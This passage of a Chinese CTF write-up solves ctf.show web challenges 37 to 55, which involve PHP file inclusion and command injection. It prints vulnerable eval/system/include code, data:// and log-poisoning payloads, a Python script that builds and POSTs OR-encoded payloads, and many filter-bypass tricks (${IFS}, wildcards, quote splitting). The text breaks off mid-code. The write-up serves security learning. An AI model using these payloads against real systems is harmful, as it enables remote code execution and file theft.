class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZionKTs/Pg==  </span><br><span class="hljs-comment">//将 &lt;?php system(&#x27;cat f*&#x27;);   进行base64编码</span><br></code></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>可以使用上一题解法，但是过滤了php，可以使用 &lt;?&#x3D; 代替 &lt;? php</p><p>也可以使用<strong>日志文件包含</strong>：</p><p>抓包得知该网站为 nginx 中间件，所以日志文件的路径为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>我们将网页抓包：</p><p><img src="https://s2.loli.net/2022/12/23/oEwH24bsU9XWBa1.png" alt="image-20221223192438921"></p><p>修改网站的 UA 为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat f*&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后url传参 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/<span class="hljs-keyword">var</span>/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>这时由于我们的 UA 修改为php脚本了，所以在日志文件中会存在记录，然后再把日志文件包含到当前php文件中，此时日志中存在的php脚本就执行了，我们就查到了flag</p><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们发现 include中变量后拼接了一个 .php </p><p>但是由于我们使用 data:&#x2F;&#x2F; 协议，后面的php代码中 ?&gt; 闭合了，导致后面的 .php 没有什么影响</p><p>于是，payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=data:<span class="hljs-comment">//text/plain,&lt;?= system(&#x27;cat f*&#x27;);?&gt;</span><br>?c=data:<span class="hljs-comment">//text/plain;base64,PD89IHN5c3RlbSgnY2F0IGYqJyk7Pz4=</span><br></code></pre></td></tr></table></figure><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>这里把中文括号过滤了，并没有过滤英文括号</p><p>所以我们可以使用前面的payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">highlight_file</span> (<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><p>还有一种方法，我们可以使用它来获取当前目录下文件列表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-title function_ invoke__">session_id</span>());<br></code></pre></td></tr></table></figure><p><strong>session_id()函数</strong></p><blockquote><p><strong>session_id()</strong> 返回当前会话ID。   如果当前没有会话，则返回空字符串（<code>&quot;&quot;</code>）。  </p></blockquote><p>cookie中:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">PHPSESSID=ls<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/12/23/yAz19K5rSs4EatO.png" alt="image-20221223194755777" style="zoom: 25%;" /><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c </span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;echo(<span class="hljs-subst">$c</span>);&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这里过滤了数字，字母，异或^，取反~,自增+  </p><p>但是没有过滤或 | ，于是可以通过或 | 构造出我们想要的参数，如 system(‘ls’); </p><p>原理：使用除了正则之外的字符来使用或运算产生我们想要的字符串</p><p>我们可以使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://457b621b-6658-46c5-bf8c-65c0b8066bb6.challenge.ctf.show/&quot;</span>   <span class="hljs-comment"># 自己修改url</span><br><br>a=[]<br>ans1=<span class="hljs-string">&quot;&quot;</span><br>ans2=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>):<br>    c=<span class="hljs-built_in">chr</span>(i)<br>    tmp = re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;</span>,c, re.I)   <span class="hljs-comment"># 正则过滤的参数</span><br>    <span class="hljs-keyword">if</span>(tmp):<br>        <span class="hljs-keyword">continue</span><br>        <span class="hljs-comment">#print(tmp.group(0))</span><br>    <span class="hljs-keyword">else</span>:<br>        a.append(i)<br><br><span class="hljs-comment"># eval(&quot;echo($c);&quot;);</span><br>mya=<span class="hljs-string">&quot;system&quot;</span>  <span class="hljs-comment">#函数名 这里修改！</span><br>myb=<span class="hljs-string">&quot;cat f*&quot;</span>      <span class="hljs-comment">#参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">myfun</span>(<span class="hljs-params">k,my</span>):<br>    <span class="hljs-keyword">global</span> ans1<br>    <span class="hljs-keyword">global</span> ans2<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i,<span class="hljs-built_in">len</span>(a)):<br>            <span class="hljs-keyword">if</span>(a[i]|a[j]==<span class="hljs-built_in">ord</span>(my[k])):<br>                ans1+=<span class="hljs-built_in">chr</span>(a[i])<br>                ans2+=<span class="hljs-built_in">chr</span>(a[j])<br>                <span class="hljs-keyword">return</span>;<br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(mya)):<br>    myfun(k,mya)<br>data1=<span class="hljs-string">&quot;(\&quot;&quot;</span>+ans1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+ans2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>ans1=<span class="hljs-string">&quot;&quot;</span><br>ans2=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(myb)):<br>    myfun(k,myb)<br>data2=<span class="hljs-string">&quot;(\&quot;&quot;</span>+ans1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+ans2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br><br>data=&#123;<span class="hljs-string">&quot;c&quot;</span>:data1+data2&#125;<br>r=requests.post(url=url,data=data)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h3 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>参考文章：</p><h3 id="linux中-dev-null-2-1和2-1-dev-null"><a href="#linux中-dev-null-2-1和2-1-dev-null" class="headerlink" title="linux中&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1和2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null"></a><a href="https://www.cnblogs.com/kexianting/p/11630085.html">linux中&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1和2&gt;&amp;1 &gt; &#x2F;dev&#x2F;null</a></h3><p>看了文章之后，我们大概知道了如下 linux命令的意思</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;/dev/<span class="hljs-literal">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>大概就是   &gt; 在linux中代表输出重定向（把标准输出重定向到指定的文件或位置）等同于 1&gt;</p><p>所以： &gt;&#x2F;dev&#x2F;null   </p><p>等同于 1&gt;&#x2F;dev&#x2F;null ，就是将标准输出重定向到 &#x2F;dev&#x2F;null 中，&#x2F;dev&#x2F;null代表 linux 的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。</p><p>所以如果我们使用cat进行查询的话，页面是不会有任何输出的</p><p>而， 2&gt;&amp;1 进行了重定向绑定，使用&amp;可以将两个输出绑定在一起，即将错误输出绑定到标准输出的位置，也就是错误输出也写入“黑洞”了。</p><p>执行了这条命令之后，<strong>该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">如果<br>&gt;/dev/<span class="hljs-literal">null</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br>变为：<br><span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> &gt;/dev/<span class="hljs-literal">null</span>  的话，意思是截然不同的<br></code></pre></td></tr></table></figure><p>首先 2&gt;&amp;1  将错误输出重定向绑定到标准输出中，此时标准输出为屏幕，所以错误输出在屏幕中，</p><p>而 &gt;&#x2F;dev&#x2F;null   等同于 1&gt;&#x2F;dev&#x2F;null   将标准输出重定向到黑洞。</p><table><thead><tr><th>命令</th><th>标准输出</th><th>错误输出</th></tr></thead><tbody><tr><td>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1</td><td>丢弃</td><td>丢弃</td></tr><tr><td>2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null</td><td>丢弃</td><td>屏幕</td></tr></tbody></table><p>综上，我们可以写两条语句即可，前一条给system进行执行，后一条语句被输出到黑洞中了</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=cat f*%<span class="hljs-number">26</span>%<span class="hljs-number">26</span><span class="hljs-comment">// &amp;需要编码为 %26 因为使用的是url传参，&amp;有其他用途</span><br>?c=cat f*%<span class="hljs-number">26</span><br>?c=cat f*%<span class="hljs-number">7</span>C%<span class="hljs-number">7</span>C <span class="hljs-comment">// | 可以编码为%7C,也可以不编码</span><br>?c=cat f*||<br><span class="hljs-comment">//不能使用一个或 |  因为|会将左边的结果作为右边的输入，这样就会将结果给丢弃(黑洞)</span><br></code></pre></td></tr></table></figure><p>也可以使用分号 ;  这样前面的语句与后面就相分隔了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=cat f*;<br></code></pre></td></tr></table></figure><p>还可以使用 %0a 进行换行，命令不在同一行，当然不会进行输出重定向了</p><h3 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>禁用了 cat 和 分号;   可以继续使用上面的姿势</p><blockquote><h4 id="linux-查看文件内容的方式"><a href="#linux-查看文件内容的方式" class="headerlink" title="linux 查看文件内容的方式"></a><strong>linux 查看文件内容的方式</strong></h4><p>cat：从第一行开始显示文本内容（适用于内容较少的）</p><p>tac：从最后一行开始显示，是 cat 的逆顺序</p><p>more：一页一页的显示文本内容（适用于内容较多的）</p><p>less：与 more 类似，但是比 more 更好的是，它可以往前翻页！</p><p>head：只看文本的前面几行</p><p>tail：只看文本的后面几行</p><p>nl：显示文本内容与行号</p><p>od:以二进制的方式读取档案内容</p><p>vi:一种编辑器，这个也可以查看</p><p>vim:一种编辑器，这个也可以查看</p><p>sort:可以查看</p><p>uniq:可以查看</p><p>file -f:报错出具体内容 </p><p>grep<br>1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings</p></blockquote><h3 id="web44-45"><a href="#web44-45" class="headerlink" title="web44-45"></a>web44-45</h3><p>linux中 空格可以使用 ${IFS}  $IFS   $IFS$9 绕过</p><p>flag关键字，可以加引号 ‘’绕过， fla’’g  或者使用通配符 f*    fla?.php</p><h3 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>把 $ * 数字过滤了</p><p>我们就不能使用 ${IFS} 等技巧绕过空格了，我们可以使用 %09（tab，url解码后不算数字）绕过</p><p>我们也可以使用 输出重定向 &lt;  将 flag.php 内容读取，绕过了空格</p><p>过滤了 * 我们可以使用 ?  如：fla?.php   </p><p>我们也可以使用 可以加引号 ‘’绕过， fla’’g  </p><p>过滤了cat关键字，我们可以加转义 ca\t  或者加引号  ca’’t  </p><p>或者 ca$1t   </p><blockquote><p><strong>linux shell中$n表示传递给脚本或函数的参数</strong>。n 是一个数字，表示第几个参数。<br> 例如，第一个参数是1，第二个参数是2。而参数不存在时其值为空。<br> $@表示<br> 比如：ca$@t fla$@g<br> ca$1t fla$2g</p></blockquote><h3 id="web47-51"><a href="#web47-51" class="headerlink" title="web47-51"></a>web47-51</h3><p>payload类似</p><h3 id="web52-53"><a href="#web52-53" class="headerlink" title="web52-53"></a>web52-53</h3><p>flag换到了根目录下 &#x2F;flag,</p><p>这一题没有过滤 $  可以使用 ${IFS} 绕过空格</p><p>ca\t  或  ca’’t  绕过过滤</p><h3 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>可以使用 linux rev 命令</p><h4 id="rev"><a href="#rev" class="headerlink" title="rev"></a>rev</h4><blockquote><p>rev 命令用于将文件中的每行内容以字符为单位反序输出，即第一个字符最后输出，最后一个字符最先输出，以此类推。</p></blockquote><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=rev$&#123;IFS&#125;fla?.php<br></code></pre></td></tr></table></figure><p>或者，可以直接在根目录下找到cat命令进行查询文件</p><blockquote><p>cat 命令在linux 的  &#x2F;bin&#x2F;cat  路径</p></blockquote><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/bin/?at$&#123;IFS&#125;fla?.php<br></code></pre></td></tr></table></figure><h3 id="无字母数字webshell总结"><a href="#无字母数字webshell总结" class="headerlink" title="无字母数字webshell总结"></a><a href="https://xz.aliyun.com/t/8107#toc-0">无字母数字webshell总结</a></h3><h3 id="web55"><a href="#web55" class="headerlink" title="web55"></a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>我们发现这一题过滤了字母，但是没有过滤数字</p><p><strong>方法一</strong>：</p><p>我们知道linux有一个base64命令，在  &#x2F;bin&#x2F;base64   路径下</p><p>于是我们可以构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/???/????<span class="hljs-number">64</span> ????.???<br></code></pre></td></tr></table></figure><p>使用通配符去匹配了   &#x2F;bin&#x2F;base64  flag.php</p><p>从而将 flag.php  网页进行base64编码后打印出来</p><p><strong>方法二</strong>：</p><p>有一个bzip2命令，该命令也有数字，命令所处路径： &#x2F;usr&#x2F;bin&#x2F;bzip2</p><p>于是构造payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=/???/???/????<span class="hljs-number">2</span> ????.???<br></code></pre></td></tr></table></figure><p>该命令会将 flag.php 压缩，成为一个bz2压缩文件</p><p>我们只需访问flag.php.bz2将文件下载，查看源代码即可</p><p>方法三：</p><p>这一题没有过滤 小数点.  </p><p>然后linux中 小数点.  相当与source命令，可以执行shell脚本</p><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><blockquote><p>在当前bash环境下读取并执行fileName中的命令。</p><p>*注：该命令通常用命令“.”来替代。</p><p>使用范例：</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">source filename <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">中间有空格</span><br>. filename<br></code></pre></td></tr></table></figure><p>于是，我们可以post上传一个文件，文件中包含了shell命令，到该服务器，上传的时候使用点. 去执行该脚本</p><p>一般临时文件在linux中保存在 &#x2F;tmp&#x2F;php??????  路径下，后面的6个字符是随机生成的（可以通过通配符匹配）</p><p>于是我们可以自己构造一个post上传文件的网页：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 